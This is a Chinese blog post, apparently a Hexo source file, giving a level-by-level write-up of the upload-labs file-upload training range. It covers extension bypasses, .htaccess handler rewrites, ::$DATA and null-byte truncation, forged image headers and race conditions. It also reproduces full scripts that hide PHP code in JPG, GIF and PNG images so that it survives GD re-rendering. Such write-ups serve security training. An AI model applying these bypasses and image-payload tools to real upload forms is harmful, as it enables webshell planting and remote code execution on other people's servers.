.`猜测可能存在绕过。\n\n![009_1](/img/fileupload/upload-labs/009_1.png)\n\n![009_2](/img/fileupload/upload-labs/009_2.png)\n\n查看源码\n\n![009_3](/img/fileupload/upload-labs/009_3.png)\n\n产生问题的原因是只删除了一次点号,当上传`info.php. .`时,先删除第一个点得到`info.php. `最后变成了点绕过。\n\n## 0x10\n\n### 双写后缀名绕过\n\n```\n发现php替换成了空\n上传default.pphphp即可成功,应该是源代码中只替换了一次\n\n上传后没有改名\t\t√\n可上传jreg、png、gif、jpg\t\t√\n可上传::$DATA\t\t√\n替换php为空\n```\n\n![010_1](/img/fileupload/upload-labs/010_1.png)\n\n![010_2](/img/fileupload/upload-labs/010_2.png)\n\n 查看源码\n\n![010_3](/img/fileupload/upload-labs/010_3.png)\n\n## 0x11\n\n### %00截断绕过白名单\n\n```\n白名单\n双写后缀\t\t×\n特殊后缀名\t\t×\n::$DATA\t\t\t×\n文件上传被改名     √\n可上传png、gif、jpg\t\t√\n```\n\n**PHP版本低于5.3.29，且GPC关闭**下是可以突破的\n\n![011_1](/img/fileupload/upload-labs/011_1.png)\n\n![011_2](/img/fileupload/upload-labs/011_2.png)\n\n查看源码\n\n![011_3](/img/fileupload/upload-labs/011_3.png)\n\n问题的根源是上传的路径是用户可控的,当上传的路径为`save_path=../upload/yyg.php%00`后还会进行拼接,在接下来移动文件的时候经过`%00`截断后保留文件为`yyg.php`.\n\n![011_4](/img/fileupload/upload-labs/011_4.png)\n\n用户能够控制上传路径是十分危险的。\n\n## 0x12\n\n### 0x00截断绕过白名单\n\n应该还是白名单,测试下先\n\n```\n双写后缀\t\t×\n可上传png、gif、jpg\t\t√\n文件上传被改名，后缀保留\t\t√ \n特殊后缀名\t\t×\n\n```\n\n**PHP版本低于5.3.29，且GPC关闭**下是可以突破的\n\n用burp抓包发现可以控制`save_path`,和get方式不同,POST方式利用0x00截断\n\n![012_1](/img/fileupload/upload-labs/012_1.png)\n\n选中%00，用快捷键`ctrl+shift+u`后Go\n\n![012_2](/img/fileupload/upload-labs/012_2.png)\n\n成了\n\n![012_3](/img/fileupload/upload-labs/012_3.png)\n\n也可以用这种方式\n\n![012_4](/img/fileupload/upload-labs/012_4.png)\n\n![012_5](/img/fileupload/upload-labs/012_5.png)\n\n![012_6](/img/fileupload/upload-labs/012_6.png)\n\n查看源码\n\n![012_7](/img/fileupload/upload-labs/012_7.png)\n\n可以看到与Pass-11只是用了POST方式\n\n截断利用条件\n\n1. php版本小于`5.3.29` `。\n2. php的`magic_quotes_gpc`为OFF状态。\n3. 拼接点在`url`处即`get`使用`%00`\n4. 拼接点在`post`处使用`0x00`\n\n## 0x13\n\n### 绕过二进制文件前两位ASCII检测\n\n![013_1](/img/fileupload/upload-labs/013_1.png)\n\n这一课需求变了,要求上传图片马,简单测试发现是白名单,会拼接图片后缀。上传图片马后还需要文件包含漏洞才行,但是作者提供的环境有没有文件包含。自己写一份本地验证。\n\n```\n#includes.php 放在upload-labs根路径\n<?php\n\terror_reporting(0);\n\tif ($_GET['file']) {\n\t\t$file = $_GET['file'];\n\t\tinclude $file;\n\t} else {\n\t\tinclude 'index.php';\n\t}\n?>\n```\n\nburp抓包修改上传的gif文件,末尾插入phpinfo。png和jpg都能用这种方法。\n\n![013_2](/img/fileupload/upload-labs/013_2.png)\n\n![013_3](/img/fileupload/upload-labs/013_3.png)\n\n查看源码后发现考点在文件头幻数检测。\n\n![013_4](/img/fileupload/upload-labs/013_4.png)\n\nJPG\n\n```\n#16进制\nFF D8 FF E0 00 10 4A 46 49 46\n```\n\nGIF\n\n```\n#16进制\n47 49 46 38 39 61\n```\n\n(相当于文本的GIF89a,一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）\n\nPNG\n\n```\n#16进制\n89 50 4E 47\n```\n\n上传一个没有内容的空文件。\n\n![013_5](/img/fileupload/upload-labs/013_5.png)\n\nGIF用自己添加的文件包含php验证\n\n![013_6](/img/fileupload/upload-labs/013_6.png)\n\nPNG:\n\n可以用`ctrl+shift+u`快捷键将`%89`直接转hex\n\n![013_7](/img/fileupload/upload-labs/013_7.png)\n\nJPG:\n\n可以用`ctrl+shift+u`快捷键将`%FF%D8%FF%E0%00%10%4A%46%49%46`\n\n![013_8](/img/fileupload/upload-labs/013_8.png)\n\n## 0x14\n\n### 突破getimagesize()\n\n尝试了下用Pass-13的方法依然能上传图片马.png和jpg一样.\n\n![014_1](/img/fileupload/upload-labs/014_1.png)\n\n查看源码\n\n![014_2](/img/fileupload/upload-labs/014_2.png)\n\n这里是利用getimages函数来获取图片的宽高信息的,如果上传的不是图片,那就获取不到信息.\n\n依旧可以利用补充对应的图片文件头绕过.\n\npng:\n\npng有些特殊,光给文件头还不行,需指定文件大小。把下面这段\n\n`%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52`\n\n带入\n\n![014_3](/img/fileupload/upload-labs/014_3.png)\n\n选中后用`ctrl+shift+u`快捷键。\n\n![014_4](/img/fileupload/upload-labs/014_4.png)\n\n![014_5](/img/fileupload/upload-labs/014_5.png)\n\njpg:\n\n测试失败,即使是上传正常的jpg也被拒绝。\n\n## 0x15\n\n### 突破exif_imagetype()\n\ngif:\n\n![015_1](/img/fileupload/upload-labs/015_1.png)\n\npng:``%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52``\n\n![015_2](/img/fileupload/upload-labs/015_2.png)\n\njpg:`%FF%D8%FF%E0%00%10%4A%46%49%46`\n\n![015_3](/img/fileupload/upload-labs/015_3.png)\n\n源码:\n\n![015_4](/img/fileupload/upload-labs/015_4.png)\n\n## 0x16\n\n### 二次渲染\n\n二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了\n\n之前的招数不管用了,这次文件上传的图片经过了二次渲染。其中的代表`imagecreatefromjpeg`函数。\n\n通过查询MD5值可以看到.\n\n```\nwindows下cmd查看MD5:certutil -hashfile \"filename\" MD5\nlinux:md5sum \"filename\"\n```\n\n![016_1](/img/fileupload/upload-labs/016_1.png)\n\n尝试了把phpinfo插入到文件的末尾,但是渲染的时候明显取不到这个位置。\n\n### jpg:\n\n可以通过毛子写的脚本生成一个二次渲染后依旧能保留payload的图片上传。\n\n利用方式,先上传jpg图片后,再把经过渲染的图片下到本地,通过\n\n`php jpg_payload.php 1.jpg`命令生成payload图片。\n\n![016_2](/img/fileupload/upload-labs/016_2.png)\n\n#### 脚本\n\n```\n<?php\n\t/*\n\n\tThe algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().\n\tIt is necessary that the size and quality of the initial image are the same as those of the processed image.\n\n\t1) Upload an arbitrary image via secured files upload script\n\t2) Save the processed image and launch:\n\tjpg_payload.php <jpg_name.jpg>\n\n\tIn case of successful injection you will get a specially crafted image, which should be uploaded again.\n\n\tSince the most straightforward injection method is used, the following problems can occur:\n\t1) After the second processing the injected data may become partially corrupted.\n\t2) The jpg_payload.php script outputs \"Something's wrong\".\n\tIf this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.\n\n\tSergey Bobrov @Black2Fan.\n\n\tSee also:\n\thttps://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\n\n\t*/\n\n\t$miniPayload = \"<?php phpinfo();?>\";\n\n\n\tif(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n    \tdie('php-gd is not installed');\n\t}\n\t\n\tif(!isset($argv[1])) {\n\t\tdie('php jpg_payload.php <jpg_name.jpg>');\n\t}\n\n\tset_error_handler(\"custom_error_handler\");\n\n\tfor($pad = 0; $pad < 1024; $pad++) {\n\t\t$nullbytePayloadSize = $pad;\n\t\t$dis = new DataInputStream($argv[1]);\n\t\t$outStream = file_get_contents($argv[1]);\n\t\t$extraBytes = 0;\n\t\t$correctImage = TRUE;\n\n\t\tif($dis->readShort() != 0xFFD8) {\n\t\t\tdie('Incorrect SOI marker');\n\t\t}\n\n\t\twhile((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n\t\t\t$marker = $dis->readByte();\n\t\t\t$size = $dis->readShort() - 2;\n\t\t\t$dis->skip($size);\n\t\t\tif($marker === 0xDA) {\n\t\t\t\t$startPos = $dis->seek();\n\t\t\t\t$outStreamTmp = \n\t\t\t\t\tsubstr($outStream, 0, $startPos) . \n\t\t\t\t\t$miniPayload . \n\t\t\t\t\tstr_repeat(\"\\0\",$nullbytePayloadSize) . \n\t\t\t\t\tsubstr($outStream, $startPos);\n\t\t\t\tcheckImage('_'.$argv[1], $outStreamTmp, TRUE);\n\t\t\t\tif($extraBytes !== 0) {\n\t\t\t\t\twhile((!$dis->eof())) {\n\t\t\t\t\t\tif($dis->readByte() === 0xFF) {\n\t\t\t\t\t\t\tif($dis->readByte !== 0x00) {\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$stopPos = $dis->seek() - 2;\n\t\t\t\t\t$imageStreamSize = $stopPos - $startPos;\n\t\t\t\t\t$outStream = \n\t\t\t\t\t\tsubstr($outStream, 0, $startPos) . \n\t\t\t\t\t\t$miniPayload . \n\t\t\t\t\t\tsubstr(\n\t\t\t\t\t\t\tstr_repeat(\"\\0\",$nullbytePayloadSize).\n\t\t\t\t\t\t\t\tsubstr($outStream, $startPos, $imageStreamSize),\n\t\t\t\t\t\t\t0,\n\t\t\t\t\t\t\t$nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n\t\t\t\t\t\t\t\tsubstr($outStream, $stopPos);\n\t\t\t\t} elseif($correctImage) {\n\t\t\t\t\t$outStream = $outStreamTmp;\n\t\t\t\t} else {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif(checkImage('payload_'.$argv[1], $outStream)) {\n\t\t\t\t\tdie('Success!');\n\t\t\t\t} else {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tunlink('payload_'.$argv[1]);\n\tdie('Something\\'s wrong');\n\n\tfunction checkImage($filename, $data, $unlink = FALSE) {\n\t\tglobal $correctImage;\n\t\tfile_put_contents($filename, $data);\n\t\t$correctImage = TRUE;\n\t\timagecreatefromjpeg($filename);\n\t\tif($unlink)\n\t\t\tunlink($filename);\n\t\treturn $correctImage;\n\t}\n\n\tfunction custom_error_handler($errno, $errstr, $errfile, $errline) {\n\t\tglobal $extraBytes, $correctImage;\n\t\t$correctImage = FALSE;\n\t\tif(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n\t\t\tif(isset($m[1])) {\n\t\t\t\t$extraBytes = (int)$m[1];\n\t\t\t}\n\t\t}\n\t}\n\n\tclass DataInputStream {\n\t\tprivate $binData;\n\t\tprivate $order;\n\t\tprivate $size;\n\n\t\tpublic function __construct($filename, $order = false, $fromString = false) {\n\t\t\t$this->binData = '';\n\t\t\t$this->order = $order;\n\t\t\tif(!$fromString) {\n\t\t\t\tif(!file_exists($filename) || !is_file($filename))\n\t\t\t\t\tdie('File not exists ['.$filename.']');\n\t\t\t\t$this->binData = file_get_contents($filename);\n\t\t\t} else {\n\t\t\t\t$this->binData = $filename;\n\t\t\t}\n\t\t\t$this->size = strlen($this->binData);\n\t\t}\n\n\t\tpublic function seek() {\n\t\t\treturn ($this->size - strlen($this->binData));\n\t\t}\n\n\t\tpublic function skip($skip) {\n\t\t\t$this->binData = substr($this->binData, $skip);\n\t\t}\n\n\t\tpublic function readByte() {\n\t\t\tif($this->eof()) {\n\t\t\t\tdie('End Of File');\n\t\t\t}\n\t\t\t$byte = substr($this->binData, 0, 1);\n\t\t\t$this->binData = substr($this->binData, 1);\n\t\t\treturn ord($byte);\n\t\t}\n\n\t\tpublic function readShort() {\n\t\t\tif(strlen($this->binData) < 2) {\n\t\t\t\tdie('End Of File');\n\t\t\t}\n\t\t\t$short = substr($this->binData, 0, 2);\n\t\t\t$this->binData = substr($this->binData, 2);\n\t\t\tif($this->order) {\n\t\t\t\t$short = (ord($short[1]) << 8) + ord($short[0]);\n\t\t\t} else {\n\t\t\t\t$short = (ord($short[0]) << 8) + ord($short[1]);\n\t\t\t}\n\t\t\treturn $short;\n\t\t}\n\n\t\tpublic function eof() {\n\t\t\treturn !$this->binData||(strlen($this->binData) === 0);\n\t\t}\n\t}\n?>\n\n```\n\n![016_3](/img/fileupload/upload-labs/016_3.png)\n\n### gif:\n\n可以通过对比gif图删剪部分,可以尝试把payload插入到未修改部分。这里也有脚本帮助啊。\n\n`https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE`\n\n#### 脚本\n\n```\n<?php\n/**\n * Author: rickchen.vip(at)gmail.com\n * Date: 2015-04-05\n * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE\n * Reference: http://www.secgeek.net/bookfresh-vulnerability/\n * Usage: php codeinj.php demo.gif \"<?php phpinfo();?>\"\n */\n\n\nfunction gd_process($src_img, $dst_img) {\n    try {\n        # you can redefine the GD process\n        $im = imagecreatefromgif($src_img);\n        imagegif($im, $dst_img);\n    } catch (Exception $e) {\n        printf(\"%s\\n\", $e->getMessage());\n        return false;\n    }\n\n    return true;\n}\n\n\nfunction find_similar_block($src_img, $dst_img, $block_len, $slow=false) {\n    $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img));\n    $dst_data = fread(fopen($dst_img, \"rb\"), filesize($dst_img));\n    $src_index = 0;\n    $pre_match_array = array();\n\n    while ($src_index < (strlen($src_data) - $block_len)) {\n        $find_data = substr($src_data, $src_index, $block_len);\n\n        $dst_index = 0;\n        $found = false;\n        while ($dst_index < (strlen($dst_data) - $block_len)) {\n            $temp_data = substr($dst_data, $dst_index, $block_len);\n            if (0 === strcmp($find_data, $temp_data)) {\n                $match = array(\n                    \"src_offset\" => $src_index,\n                    \"dst_offset\" => $dst_index\n                );\n                $pre_match_array[] = $match;\n                $found = true;\n\n                /*\n                printf(\"Similar block found> src_offset: %d\\n\", $src_index);\n                printf(\"                     dst_offset: %d\\n\", $dst_index);\n                printf(\"                   similar_data: %s\\n\", str2hex($temp_data));\n                printf(\"                 similar_length: %s\\n\\n\", strlen($temp_data));\n                */\n            }\n            if ($found && $slow == false)\n                $dst_index += $block_len;\n            else\n                $dst_index++;\n        }\n\n        if ($found && $slow == false)\n            $src_index += $block_len;\n        else\n            $src_index++;\n    }\n\n    return $pre_match_array;\n}\n\n\nfunction inject_code_to_src_img($src_img, $pre_match_array, $injection_code) {\n    $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img));\n    $inj_len = strlen($injection_code);\n\n    $find_n = 0;\n    foreach ($pre_match_array as $similar_block) {\n        #printf(\"Trying inject code to source image with offset: %d, length: %d\\n\", $similar_block[\"src_offset\"], $inj_len);\n        $mod_src_data = substr($src_data, 0, $similar_block[\"src_offset\"]).$injection_code.substr($src_data, $similar_block[\"src_offset\"] + $inj_len);\n        $temp_img = sys_get_temp_dir().\"/\".$src_img.\".mod\";\n        $temp_cvt_img = $temp_img.\".gd\";\n        fwrite(fopen($temp_img, \"wb\"), $mod_src_data);\n\n        if (!gd_process($temp_img, $temp_cvt_img)) {\n            #printf(\"PHP-GD process() the image modified error, offset: %d\\n\", $similar_block[\"src_offset\"]);\n            #printf(\"                                           length: %d\\n\\n\", $inj_len);\n            continue;\n        } else {\n            if (check_code($temp_cvt_img, $injection_code)) {\n                $fuck_img = \"gd_\".$src_img;\n                fwrite(fopen($fuck_img, \"wb\"), $mod_src_data);\n                printf(\"Inject code to source image successful with offset: %d\\n\", $similar_block[\"src_offset\"]);\n                printf(\"Saving result \\\"%s\\\", have fun! :)\\n\", $fuck_img);\n                exit;\n            } else {\n                continue;\n                #printf(\"Modified image doesn't work well, offset: %d, retry...\\n\", $similar_block[\"src_offset\"]);\n            }\n        }\n    }\n}\n\n\nfunction check_code($src_img, $injection_code) {\n    $data = fread(fopen($src_img, \"rb\"), filesize($src_img));\n\n    return strpos($data, $injection_code);\n}\n\n\nfunction str2hex($str){\n    $hex = \"\";\n    for ($i = 0; $i < strlen($str); $i++){\n        $hex .= sprintf(\"%02x\", (ord($str[$i])));;\n    }\n\n    return $hex;\n}\n\n\nfunction hex2str($hex){\n    $str = \"\";\n    for ($i = 0; $i < strlen($hex)-1; $i+=2){\n        $str .= chr(hexdec($hex[$i].$hex[$i+1]));\n    }\n\n    return $str;\n}\n\n\n/* main */\nif ($argc < 3) {\n    printf(\"Usage: php %s <src_img> <inj_code>\\n\", $argv[0]);\n    exit;\n}\n\n$slow = false;\n$src_img = $argv[1];\n$injection_code = $argv[2];\n\n$img_info = getimagesize($src_img);\n\n/* GIF image type value \"1\" */\nif ($img_info[2] == '1') {\n    $cvt_img = sys_get_temp_dir().\"/\".basename($src_img);\n    if (!gd_process($src_img, $cvt_img)) {\n        printf(\"PHP-GD process() function error, please check out.\\n\");\n        exit;\n    }\n} else {\n    printf(\"This script only support GIF image.\\n\");\n    exit;\n}\n\n$block_len = strlen($injection_code);\n$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);\n\nif (sizeof($pre_match_array)) {\n    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);\n} else {\n    printf(\"Not found any similar %d bytes block.\\n\", strlen($injection_code));\n}\n\nprintf(\"Cant find any useful similar block to inject code, but take it easy. :(\\n\");\n\n```\n\n用其自带的`demo.gif`,我这里一次就成功了,不行的话多尝试下换一张图片或者尝试其他payload。\n\n![016_4](/img/fileupload/upload-labs/016_4.png)\n\n![016_5](/img/fileupload/upload-labs/016_5.png)\n\n### png:\n\n`https://raw.githubusercontent.com/hxer/imagecreatefrom-/master/png/poc/poc_png.py`\n\n#### 脚本\n\n```\n# -*- coding: utf-8 -*-\n\n\"\"\"\nauthor: janes\n\"\"\"\n\nimport binascii\n\n\nclass PNGError(Exception):\n\n    def __init__(self, value):\n        self.value = value\n\n    def __str__(self):\n        return repr(self.value)\n\n\nclass PNG(object):\n    \"\"\"\n    read png file and modify png data to php code, just support index-color\n    images.\n    \"\"\"\n\n    def __init__(self, fname=None):\n        if fname:\n            self.openpng(fname)\n\n    def openpng(self, fname):\n        try:\n            with open(fname, 'rb') as f:\n                self.data = f.read()\n        except:\n            err_msg = \"open {f} failed\".format(f=fname)\n            raise PNGError(err_msg)\n            \n        self.read_info()\n\n    def read_info(self):\n        try:\n            self.signature = self.data[:8]\n            self.depth = self.data[0x18]\n            self.color_type = self.data[0x19]\n        except:\n            raise PNGError('invalid png data')\n\n        if not self.check_signature():\n            raise PNGError('check png signature error')\n        if not self.check_type():\n            raise PNGError('just support index-color images')\n        if not self.check_plte():\n            raise PNGError('check PLTE chunk error')\n\n        pos = self.data.find('PLTE')\n        self.plte_len = int(self.data[pos-4: pos].encode('hex'), 16)\n        self.plte_pos = pos-4\n\n    def check_signature(self):\n        return self.signature == '89504e470d0a1a0a'.decode('hex')\n\n    def check_type(self):\n        return self.color_type == '03'.decode('hex')\n\n    def check_plte(self):\n        return self.data.find('PLTE') != -1\n\n    def set_payload(self, payload):\n        \"\"\"\n        set php code payload\n        \"\"\"\n        code_len = len(payload)\n        if code_len > self.depth*3:\n            err_msg = \"payload is too long, can't to add to png PLTE chunk\"\n            raise PNGError(err_msg)\n        self.payload = payload\n\n    def check_payload(self):\n        return len(self.payload) <= self.plte_len\n\n    def crc(self, data):\n        return '%08x' % (binascii.crc32(data) & 0xffffffff)\n\n    def modify_plte(self):\n        if self.check_payload():\n            im = list(self.data)\n            payload_pos = self.plte_pos + 8\n            # modify data to php code\n            for i in range(len(self.payload)):\n                im[payload_pos+i] = self.payload[i]\n\n            crc_pos = self.plte_pos + 8 + self.plte_len\n            crc_checks = self.crc(''.join(im[self.plte_pos+4: crc_pos]))\n            crc_checks = crc_checks.decode('hex')\n            # modify crc\n            for i in range(4):\n                im[crc_pos+i] = crc_checks[i]\n            self.im = ''.join(im)\n        else:\n            code_len = len(self.payload)            # must be a multiple of 3\n            add_len = code_len % 3\n            if add_len:\n                add_len = 3 - add_len\n                \n            plte_len = ('%08x' % (code_len+add_len)).decode('hex')\n            plte_type = 'PLTE'\n            plte_data = self.payload + ' ' * add_len\n            plte_crc = self.crc(plte_type+plte_data).decode('hex')\n            plte_chunk = plte_len + plte_type + plte_data + plte_crc\n\n            im = self.data[:self.plte_pos]\n            im += plte_chunk\n            im += self.data[(self.plte_pos+12+self.plte_len):]\n            self.im = im\n\n    def save(self, imfile):\n        with open(imfile, 'wb') as f:\n            f.write(self.im)\n\nif __name__ == \"__main__\":\n    debug = 0\n    if debug:\n        info_code = '<?php phpinfo();?>'\n\n        php_code = info_code\n        php_png = 'php_long.png'\n        png_file = 'test.png'\n    else:\n        import argparse\n\n        parser = argparse.ArgumentParser()\n        parser.add_argument('in_file', help='input png file')\n        parser.add_argument('-p', dest='payload',\n                help='php code to add to PLTE chunk', required=True)\n        parser.add_argument('-o', dest=\"out_file\", default='php.png',\n                help='output png file, default is php.png')\n        args = parser.parse_args()\n\n        png_file = args.in_file\n        php_code = args.payload\n        php_png = args.out_file\n\n    try:\n        png = PNG()\n        png.openpng(png_file)\n        png.set_payload(php_code)\n        png.modify_plte()\n        png.save(php_png)\n    except PNGError as e:\n        print \"Error massage: {}\".format(e.value)\n\n```\n\n![016_6](/img/fileupload/upload-labs/016_6.png)\n\n![016_7](/img/fileupload/upload-labs/016_7.png)\n\n## 0x17\n\n### 条件竞争\n\n利用burp重复发包\n\n![017_2](/img/fileupload/upload-labs/017_2.png)\n\n![017_3](/img/fileupload/upload-labs/017_3.png)\n\n在运行时访问,如果不成功要调高线程数。\n\n![017_1](/img/fileupload/upload-labs/017_1.png)\n\n源码：\n\n![017_4](/img/fileupload/upload-labs/017_4.png)\n\n但是上述的方式太不稳定了,可以将上传文件的内容修改为\n\n```\n<?php fputs(fopen(\"info.php\", \"w\"), \"<?php phpinfo(); ?>\"); ?>\n```\n\n一旦访问成功就创建info.php文件。\n\n## 0x18\n\n### 条件竞争结合Apache解析漏洞\n\n尝试上传文件后猜测后台应该是白名单。\n\n![018_1](/img/fileupload/upload-labs/018_1.png)\n\n没有利用的思路,翻了别人的思路,需要Apache解析漏洞和条件竞争。\n\n![018_2](/img/fileupload/upload-labs/018_2.png)\n\n![018_3](/img/fileupload/upload-labs/018_3.png)\n\n## 0x19\n\n### 利用截断\n\n测试了一下,命名的文件直接拼接上去了。这部分是用户可以控制的,尝试一下截断。\n\n**PHP版本低于5.3.29，且GPC关闭**下突破成功\n\n![019_1](/img/fileupload/upload-labs/019_1.png)\n\n查看下源码\n\n源码:\n\n![019_2](/img/fileupload/upload-labs/019_2.png)\n\n## \n\n\n\n","source":"_posts/upload-labs笔记.md","raw":"---\ntitle: upload-labs笔记\ndate: 2018-11-06 17:22:33\ntags: [文件上传]\ncategories: 文件上传\n---\n\n# upload-labs笔记\n\n---\n\n## 0x01\n\n### 前端绕过\n\n![001](/img/fileupload/upload-labs/001.png)\n\n文件在前端使用了js函数检测,绕过前端即可。\n\n使用firefox的插件NoScript直接关掉js.\n\n![001_1](/img/fileupload/upload-labs/001_1.png)\n\n![001_2](/img/fileupload/upload-labs/001_2.png)\n\n![001_3](/img/fileupload/upload-labs/001_3.png)\n\n## 0x02\n\n### MIME绕过\n\n观察源码可以分析到只对文件的类型做了白名单检测,burp抓包后修改MIME文件类型即可成功上传。\n\n![002](/img/fileupload/upload-labs/002.png)\n\n![002_1](/img/fileupload/upload-labs/002_1.png)\n\n这里有个坑啊,原来我修改的jpg格式竟然不行。\n\n![002_3](/img/fileupload/upload-labs/002_3.png)\n\n## 0x03\n\n### 特殊可解析文件绕过\n\n尝试直接上传php文件,不予许上传,估计应用了黑名单。\n\n![003](/img/fileupload/upload-labs/003.png)\n\n尝试php1,发现能上传\n\n![003_1](/img/fileupload/upload-labs/003_1.png)\n\n由于没有配置其他php文件后缀,这个思路也不行。\n\n如果Apache的配置文件可以匹配php5的其他配置文件,那这里的黑名单就没有过滤。\n\n![003_2](/img/fileupload/upload-labs/003_2.png)\n\nApache和php常用的php程序文件后缀有phtml、pht、php3、php4和php5。\n\n这里还暂时没有其他思路。\n\n## 0x04\n\n黑名单检测。可以上传的文件gif ,png, jpeg;大小写无效;\n\n![004_0](/img/fileupload/upload-labs/004_0.png)\n\n### Apache解析漏洞\n\n![004](/img/fileupload/upload-labs/004.png)\n\n### .htaccess重写文件解析规则绕过\n\n上传先上传一个名为`.htaccess`文件，内容如下：\n\n```\n<FilesMatch \"04.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n![004_1](/img/fileupload/upload-labs/004_1.png)\n\n再上传04.png的文件\n\n![004_2](/img/fileupload/upload-labs/004_2.png)\n\n产生重写文件解析规则绕过绕过的原因是httpd.conf文件中的两处配置文件的原因和过滤不严。\n\n```\n#允许重写覆盖相关配置\nAllowOverride All \nLoadModule rewrite_module modules/mod_rewrite.so\n```\n\n### PHP 和 Windows环境的叠加特性\n\n分析文章：`https://www.ctolib.com/topics-88860.html`\n\n`:截断`产生空文件\n\n![004](/img/fileupload/upload-labs/004_3.png)\n\n然后将文件名改为`04.<`或`04.<<<`或`04.>>>`或`04.>><`后再次上传，重写`4.php`文件内容，Webshell代码就会写入原来的`04.php`空文件中。\n\n![004](/img/fileupload/upload-labs/004_4.png)\n\n## 0x05\n\n### 大小写绕过\n\n黑盒测试发现是黑名单过滤\n\n```\n特殊可解析后缀 ×\n上传`.htaccess`×\n点绕过 × \nwindows流绕过 ×\n```\n\n最后发现后缀大小写能绕过\n\n![005_1](/img/fileupload/upload-labs/005_1.png)\n\n可以查看源码看看还有什么可以绕过。\n\n![005_2](/img/fileupload/upload-labs/005_2.png)\n\n## 0x06\n\n### 空格绕过\n\n黑盒测试发现是黑名单过滤\n\n```\n上传后重命名文件 √\n后缀大小写 ×\n特殊可解析后缀 ×\n::$DATA绕过 ×\n空格绕过 √\n```\n\n![006_1](/img/fileupload/upload-labs/006_1.png)\n\n查看下源码\n\n![006_2](/img/fileupload/upload-labs/006_2.png)\n\n## 0x07\n\n### .绕过\n\n```\n黑名单\n上传后没有改名 √\n可上传jreg、png、gif、jpg √\n可上传php1 pHp1 √\n空格绕过  ×\n.htaccess ×\n.绕过 √\n```\n\n![007_1](/img/fileupload/upload-labs/007_1.png)\n\n![007_2](/img/fileupload/upload-labs/007_2.png)\n\n查看源码看看\n\n![007_3](/img/fileupload/upload-labs/007_3.png)\n\n没有过滤`.`的话应该可以利用windows和php叠加特性创建php空文件。\n\n### windows和php叠加特性绕过\n\n![007_4](/img/fileupload/upload-labs/007_4.png)\n\n再利用`<`进行重写。\n\n![007_5](/img/fileupload/upload-labs/007_5.png)\n\n写入成功\n\n![007_6](/img/fileupload/upload-labs/007_6.png)\n\n## 0x08\n\n### ::$DATA绕过\n\n```\n黑名单\n上传后没有改名\t\t√\n可上传jreg、png、gif、jpg\t\t√\n可上传::$DATA\t\t√\n可上传php1,pHp1,php.xxx,php. .\t\t√\n空格绕过  ×\n.htaccess ×\n.绕过 ×\n```\n\n::DATA仅支持Windows,在info.php中写入<?php phpinfo();?> 上传info.php::$DATA会在上传目录上生成一个info.php的文件\n\n![008_1](/img/fileupload/upload-labs/008_1.png)\n\n底下插入了phpinfo函数。\n\n![008_2](/img/fileupload/upload-labs/008_2.png)\n\n![008_3](/img/fileupload/upload-labs/008_3.png)\n\n### 相关特性\n\n```\n假设上传个info.php文件,服务器为windows,info.php内容为<?php phpinfo();?>\n\ninfo.php:a.jpg 生成info.php,内容为空\ninfo.php::$DATA 生成info.php,内容为<?php phpinfo();?>\ninfo.php::$INDEX_ALLOCATION  生成info.php文件夹\ninfo.php::$DATA\\0.jpg    生成0.jpg,内容为<?php phpinfo();?>\n\n\n```\n\n把Pass-07的检查::$DATA的注释掉测试一下\n\n![008_4](/img/fileupload/upload-labs/008_4.png)\n\n以上的测试在本地通过。\n\n## 0x09\n\n### php. .绕过\n\n```\n上传后没有改名\t\t√\n可上传jreg、png、gif、jpg\t\t√\n可上传::$DATA\t\t×\n可上传php1,pHp1,php.xxx,php. .\t\t√\n.绕过 ×\n.htaccess ×\n```\n\n根据没有改名和可以上传`php. .`猜测可能存在绕过。\n\n![009_1](/img/fileupload/upload-labs/009_1.png)\n\n![009_2](/img/fileupload/upload-labs/009_2.png)\n\n查看源码\n\n![009_3](/img/fileupload/upload-labs/009_3.png)\n\n产生问题的原因是只删除了一次点号,当上传`info.php. .`时,先删除第一个点得到`info.php. `最后变成了点绕过。\n\n## 0x10\n\n### 双写后缀名绕过\n\n```\n发现php替换成了空\n上传default.pphphp即可成功,应该是源代码中只替换了一次\n\n上传后没有改名\t\t√\n可上传jreg、png、gif、jpg\t\t√\n可上传::$DATA\t\t√\n替换php为空\n```\n\n![010_1](/img/fileupload/upload-labs/010_1.png)\n\n![010_2](/img/fileupload/upload-labs/010_2.png)\n\n 查看源码\n\n![010_3](/img/fileupload/upload-labs/010_3.png)\n\n## 0x11\n\n### %00截断绕过白名单\n\n```\n白名单\n双写后缀\t\t×\n特殊后缀名\t\t×\n::$DATA\t\t\t×\n文件上传被改名     